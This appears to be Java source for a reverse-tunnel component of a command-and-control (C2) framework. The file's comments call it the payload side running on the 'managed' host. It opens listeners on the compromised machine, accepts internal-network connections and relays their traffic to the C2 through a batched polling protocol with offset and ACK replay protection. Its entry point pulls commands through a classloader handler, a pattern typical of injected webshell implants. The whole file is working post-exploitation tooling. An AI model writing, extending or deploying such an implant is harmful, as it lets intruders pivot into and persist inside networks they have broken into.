package org.leo.core.component;

import java.io.Closeable;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 反向隧道组件（payload 侧）
 * 在被管理端开 ServerSocket 接受内网客户端连接，再由 C2 通过轮询拉取新连接事件，
 * 把流量经批协议转发到 C2 侧目标。
 *
 * 操作码：
 *   0 START_LISTEN   - {listenId, listenPort, bindAddr?} → 开监听
 *   1 STOP_LISTEN    - {listenId}                       → 关监听并清理该监听下所有连接
 *   2 ACCEPT         - {listenId}                       → drain 非阻塞 accept，返回 newConns
 *   5 CLOSE          - {connId}                         → 关闭单连接
 *   6 LIST_LISTENS   - {}                               → 列出当前所有监听
 *   8 BATCH          - {frames}                         → 跨连接批处理与 offset/ACK 重放保护
 *
 * 注意：保持 Java 1.6 语法、无内部类、类型显式。
 */
public class ReverseTunnelComponent implements Runnable {

    private static final int OP_START_LISTEN = 0;
    private static final int OP_STOP_LISTEN  = 1;
    private static final int OP_ACCEPT       = 2;
    private static final int OP_CLOSE        = 5;
    private static final int OP_LIST_LISTENS = 6;

    private static final int OP_BATCH = 8;

    private static final int BUFFER_SIZE = 65536;
    private static final int MAX_FRAME_BYTES = 262144;
    private static final long IO_BUDGET_NANOS = 2000000L;
    private static final int MAX_ACCEPT_PER_CALL = 256;
    private static final int MAX_LISTENERS = 64;
    private static final int MAX_CONNECTIONS = 512;
    private static final long MAX_OFFSET = 9007199254740991L;
    private static final byte[] EMPTY = new byte[0];
    private static final int CHANNEL = 0, WRITE_ACK = 1, READ_BASE = 2, PENDING = 3,
            TERMINAL = 4, LAST_ACTIVITY = 5, LISTEN_ID = 6;

    // listenId -> ServerSocketChannel
    private static Map listenMap = new ConcurrentHashMap();
    private static Map cancelledListens = new ConcurrentHashMap();
    // listenId -> info Map(port, bindAddr)
    private static Map listenInfoMap = new ConcurrentHashMap();
    // connId -> channel, write ACK, read base, retained bytes, terminal code, last activity, listenId
    private static final Map<String, Object[]> connMap = new ConcurrentHashMap<String, Object[]>();

    private static final long IDLE_TIMEOUT_MS = 10L * 60L * 1000L;

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            status(results, 500, t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    public void invoke() throws IOException {
        sweepIdleConns();
        Object opObj = params.get("op");
        if (!(opObj instanceof Number)) {
            status(results, 400, "op must be a number");
            return;
        }
        int op = ((Number) opObj).intValue();
        if (((Number) opObj).doubleValue() != op) {
            results.put("code", Integer.valueOf(400));
            return;
        }
        if (op == OP_BATCH) {
            handleBatch();
        } else if (op == OP_START_LISTEN) {
            handleStartListen();
        } else if (op == OP_STOP_LISTEN) {
            handleStopListen();
        } else if (op == OP_ACCEPT) {
            handleAccept();
        } else if (op == OP_CLOSE) {
            handleClose();
        } else if (op == OP_LIST_LISTENS) {
            handleListListens();
        } else {
            status(results, 400, "unknown op: " + op);
        }
    }

    private void handleStartListen() {
        String listenId = getRequiredString("listenId");
        if (listenId == null) return;
        Object portObj = params.get("listenPort");
        if (!(portObj instanceof Number)) {
            status(results, 400, "listenPort required");
            return;
        }
        int listenPort = ((Number) portObj).intValue();
        Object bindAddrObj = params.get("bindAddr");
        if (bindAddrObj != null && !(bindAddrObj instanceof String)) {
            status(results, 400, "bindAddr must be a string");
            return;
        }
        String bindAddr = (String) bindAddrObj;
        if (bindAddr == null || bindAddr.length() == 0) {
            bindAddr = "127.0.0.1";
        }
        if (listenPort < 0 || listenPort > 65535) {
            status(results, 400, "listenPort out of range");
            return;
        }
        synchronized (listenMap) {
            sweepCancelledListens();
            if (cancelledListens.containsKey(listenId)) {
                status(results, 409, "listener start cancelled");
                return;
            }
        }
        if (listenMap.containsKey(listenId)) {
            status(results, 409, "listenId already exists");
            return;
        }
        ServerSocketChannel ssc = null;
        try {
            ssc = ServerSocketChannel.open();
            ssc.configureBlocking(false);
            ssc.socket().setReuseAddress(true);
            ssc.socket().bind(new InetSocketAddress(bindAddr, listenPort));
            int actualPort = ssc.socket().getLocalPort();
            HashMap info = new HashMap();
            info.put("listenId", listenId);
            info.put("listenPort", Integer.valueOf(actualPort));
            info.put("bindAddr", bindAddr);
            synchronized (listenMap) {
                if (cancelledListens.containsKey(listenId) || listenMap.containsKey(listenId)) {
                    closeQuietly(ssc);
                    status(results, 409, "listenId already exists");
                    return;
                }
                if (listenMap.size() >= MAX_LISTENERS) {
                    closeQuietly(ssc);
                    status(results, 429, "listener limit reached");
                    return;
                }
                listenMap.put(listenId, ssc);
                listenInfoMap.put(listenId, info);
            }
            status(results, 200, "listening");
            results.put("listenPort", Integer.valueOf(actualPort));
            results.put("bindAddr", bindAddr);
        } catch (IOException e) {
            closeQuietly(ssc);
            status(results, 500, "bind failed: " + e.getMessage());
        }
    }

    private void sweepCancelledListens() {
        long now = System.currentTimeMillis();
        Iterator entries = cancelledListens.entrySet().iterator();
        while (entries.hasNext()) {
            Map.Entry entry = (Map.Entry) entries.next();
            if (((Long) entry.getValue()).longValue() <= now) cancelledListens.remove(entry.getKey());
        }
    }

    private void handleStopListen() {
        String listenId = getRequiredString("listenId");
        if (listenId == null) return;
        ServerSocketChannel ssc;
        synchronized (listenMap) {
            sweepCancelledListens();
            if (!cancelledListens.containsKey(listenId) && cancelledListens.size() >= 512) {
                Object oldestKey = null;
                long oldest = Long.MAX_VALUE;
                for (Object value : cancelledListens.entrySet()) {
                    Map.Entry entry = (Map.Entry) value;
                    long expires = ((Long) entry.getValue()).longValue();
                    if (expires < oldest) { oldest = expires; oldestKey = entry.getKey(); }
                }
                if (oldestKey != null) cancelledListens.remove(oldestKey);
            }
            cancelledListens.put(listenId, Long.valueOf(System.currentTimeMillis() + 600000L));
            ssc = (ServerSocketChannel) listenMap.remove(listenId);
            listenInfoMap.remove(listenId);
        }
        if (ssc == null) {
            status(results, 404, "listenId not found");
            return;
        }
        closeQuietly(ssc);
        // 清理该监听下所有 connId
        int closed = 0;
        for (Map.Entry<String, Object[]> entry : connMap.entrySet()) {
            Object[] state = entry.getValue();
            if (listenId.equals(state[LISTEN_ID]) && closeConnection(entry.getKey(), state)) closed++;
        }
        status(results, 200, "stopped");
        results.put("closedConns", Integer.valueOf(closed));
    }

    private void handleAccept() throws IOException {
        String listenId = getRequiredString("listenId");
        if (listenId == null) return;
        ServerSocketChannel ssc = (ServerSocketChannel) listenMap.get(listenId);
        if (ssc == null) {
            status(results, 404, "listenId not found");
            return;
        }
        List newConns = new ArrayList();
        boolean capacityReached = false;
        // drain 非阻塞 accept
        while (newConns.size() < MAX_ACCEPT_PER_CALL) {
            SocketChannel sc = ssc.accept();
            if (sc == null) break;
            try {
                sc.configureBlocking(false);
                sc.socket().setTcpNoDelay(true);
            } catch (IOException error) {
                closeQuietly(sc);
                continue;
            }
            String connId = generateConnId(listenId);
            synchronized (listenMap) {
                if (listenMap.get(listenId) != ssc) {
                    closeQuietly(sc);
                    break;
                }
                synchronized (connMap) {
                    if (connMap.size() >= MAX_CONNECTIONS) {
                        closeQuietly(sc);
                        capacityReached = true;
                        break;
                    }
                    connMap.put(connId, new Object[]{sc, Long.valueOf(0), Long.valueOf(0), EMPTY,
                            Integer.valueOf(0), new AtomicLong(System.currentTimeMillis()), listenId});
                }
            }
            HashMap info = new HashMap();
            info.put("connId", connId);
            info.put("clientAddr", sc.socket().getInetAddress() != null
                    ? sc.socket().getInetAddress().getHostAddress() : "");
            info.put("clientPort", Integer.valueOf(sc.socket().getPort()));
            newConns.add(info);
        }
        results.put("code", Integer.valueOf(200));
        results.put("newConns", newConns);
        if (capacityReached) results.put("capacityReached", Boolean.TRUE);
    }

    /** Validate the whole envelope before any socket is touched. Each frame owns one bounded window. */
    private void handleBatch() {
        Object value = params.get("frames");
        if (!(value instanceof java.util.List) || ((java.util.List) value).size() < 1
                || ((java.util.List) value).size() > 16) {
            status(results, 400, "BATCH requires 1..16 frames");
            return;
        }
        java.util.List frames = (java.util.List) value;
        Map ids = new HashMap();
        long bytes = 0;
        for (int i = 0; i < frames.size(); i++) {
            if (!(frames.get(i) instanceof Map)) { results.put("code", Integer.valueOf(400)); return; }
            Map frame = (Map) frames.get(i);
            Object id = frame.get("connId");
            Object data = frame.get("data");
            long limit = batchOffset(frame.get("maxBytes"));
            long writeOffset = batchOffset(frame.get("writeOffset"));
            if (!(id instanceof String) || ((String) id).length() == 0 || ids.put(id, Boolean.TRUE) != null
                    || !(data instanceof byte[]) || ((byte[]) data).length > MAX_FRAME_BYTES
                    || limit < 1 || limit > MAX_FRAME_BYTES || writeOffset < 0
                    || writeOffset > MAX_OFFSET - ((byte[]) data).length
                    || batchOffset(frame.get("readAck")) < 0) {
                status(results, 400, "invalid BATCH frame");
                return;
            }
            bytes += ((byte[]) data).length + limit;
        }
        if (bytes > 1048576L) { results.put("code", Integer.valueOf(400)); return; }
        java.util.List replies = new java.util.ArrayList();
        for (int i = 0; i < frames.size(); i++) replies.add(exchangeFrame((Map) frames.get(i)));
        results.put("code", Integer.valueOf(200));
        results.put("frames", replies);
    }

    private static long batchOffset(Object value) {
        if (!(value instanceof Number)) return -1;
        Number number = (Number) value;
        long offset = number.longValue();
        return offset >= 0 && offset <= MAX_OFFSET && number.doubleValue() == offset ? offset : -1;
    }

    private Map exchangeFrame(Map frame) {
        String connId = (String) frame.get("connId");
        HashMap reply = new HashMap();
        reply.put("connId", connId);
        Object[] state = connMap.get(connId);
        if (state == null) { reply.put("code", Integer.valueOf(404)); return reply; }
        SocketChannel sc = (SocketChannel) state[CHANNEL];
        synchronized (state) {
            if (connMap.get(connId) != state) { reply.put("code", Integer.valueOf(404)); return reply; }
            long writeAck = ((Long) state[WRITE_ACK]).longValue();
            long readBase = ((Long) state[READ_BASE]).longValue();
            byte[] pending = (byte[]) state[PENDING];
            long writeOffset = batchOffset(frame.get("writeOffset"));
            long readAck = batchOffset(frame.get("readAck"));
            byte[] data = (byte[]) frame.get("data");
            if (writeOffset > writeAck || readAck > readBase + pending.length) {
                status(reply, 409, "offset gap or invalid read ACK");
                return reply;
            }
            // Stale retries never rewind an ACK. A lost response retains its read bytes here.
            int acknowledged = (int) Math.max(0L, readAck - readBase);
            if (acknowledged > 0) {
                byte[] rest = acknowledged == pending.length ? EMPTY : new byte[pending.length - acknowledged];
                System.arraycopy(pending, acknowledged, rest, 0, rest.length);
                pending = rest;
                readBase += acknowledged;
                state[READ_BASE] = Long.valueOf(readBase);
                state[PENDING] = pending;
            }
            int skip = (int) Math.min((long) data.length, writeAck - writeOffset);
            ByteBuffer outgoing = ByteBuffer.wrap(data, skip, data.length - skip);
            int limit = (int) batchOffset(frame.get("maxBytes"));
            ByteBuffer incoming = ByteBuffer.allocate(Math.max(pending.length, Math.min(BUFFER_SIZE, limit)));
            incoming.put(pending);
            int terminal = ((Integer) state[TERMINAL]).intValue();
            long deadline = System.nanoTime() + IO_BUDGET_NANOS;
            try {
                while (terminal == 0) {
                    if (!incoming.hasRemaining() && incoming.position() < limit) {
                        ByteBuffer larger = ByteBuffer.allocate(Math.min(limit, incoming.capacity() * 2));
                        incoming.flip(); larger.put(incoming); incoming = larger;
                    }
                    int written = outgoing.hasRemaining() ? sc.write(outgoing) : 0;
                    if (written > 0) { writeAck += written; state[WRITE_ACK] = Long.valueOf(writeAck); }
                    int read = incoming.position() < limit ? sc.read(incoming) : 0;
                    if (read < 0) { terminal = 404; break; }
                    if ((written == 0 && read == 0) || System.nanoTime() >= deadline
                            || (!outgoing.hasRemaining() && incoming.position() >= limit)) break;
                }
            } catch (IOException error) { terminal = 500; }
            pending = incoming.position() == 0 ? EMPTY : new byte[incoming.position()];
            incoming.flip(); incoming.get(pending);
            state[PENDING] = pending;
            state[TERMINAL] = Integer.valueOf(terminal);
            if (terminal != 0) closeQuietly(sc);
            ((AtomicLong) state[LAST_ACTIVITY]).set(System.currentTimeMillis());
            int size = Math.min(limit, pending.length);
            byte[] received = size == 0 ? EMPTY : new byte[size];
            System.arraycopy(pending, 0, received, 0, size);
            reply.put("code", Integer.valueOf(200));
            reply.put("writeAck", Long.valueOf(writeAck));
            reply.put("readOffset", Long.valueOf(readBase));
            reply.put("readCode", Integer.valueOf(terminal != 0 && size == pending.length
                    ? terminal : size == 0 ? 204 : 200));
            reply.put("data", received);
            return reply;
        }
    }

    private void handleClose() {
        String connId = getRequiredString("connId");
        if (connId == null) return;
        closeConnection(connId, connMap.get(connId));
        results.put("code", Integer.valueOf(200));
    }

    private String getRequiredString(String key) {
        Object value = params.get(key);
        if (value instanceof String && ((String) value).length() > 0) return (String) value;
        status(results, 400, key + " required");
        return null;
    }

    private static boolean closeConnection(String connId, Object[] state) {
        if (state == null) return false;
        synchronized (connMap) {
            if (connMap.get(connId) != state) return false;
            connMap.remove(connId);
        }
        closeQuietly((SocketChannel) state[CHANNEL]);
        return true;
    }

    /**
     * 请求入口清理过期连接；连接锁保护活动时间，身份检查保护已移除的连接。
     */
    private static void sweepIdleConns() {
        long now = System.currentTimeMillis();
        for (Map.Entry<String, Object[]> entry : connMap.entrySet()) {
            Object[] state = entry.getValue();
            AtomicLong activity = (AtomicLong) state[LAST_ACTIVITY];
            if (now - activity.get() > IDLE_TIMEOUT_MS) {
                synchronized (state) {
                    if (now - activity.get() > IDLE_TIMEOUT_MS) closeConnection(entry.getKey(), state);
                }
            }
        }
    }

    private static void status(Map response, int code, String message) {
        response.put("code", Integer.valueOf(code));
        response.put("msg", message);
    }

    private static void closeQuietly(Closeable resource) {
        try { if (resource != null) resource.close(); } catch (IOException ignored) { }
    }

    private void handleListListens() {
        List list = new ArrayList();
        Iterator it = listenInfoMap.values().iterator();
        while (it.hasNext()) {
            list.add(it.next());
        }
        results.put("code", Integer.valueOf(200));
        results.put("listens", list);
    }

    private String generateConnId(String listenId) {
        long n = System.nanoTime();
        int r = (int) (Math.random() * 0x7fffffff);
        return listenId + "-" + Long.toHexString(n) + "-" + Integer.toHexString(r);
    }
}
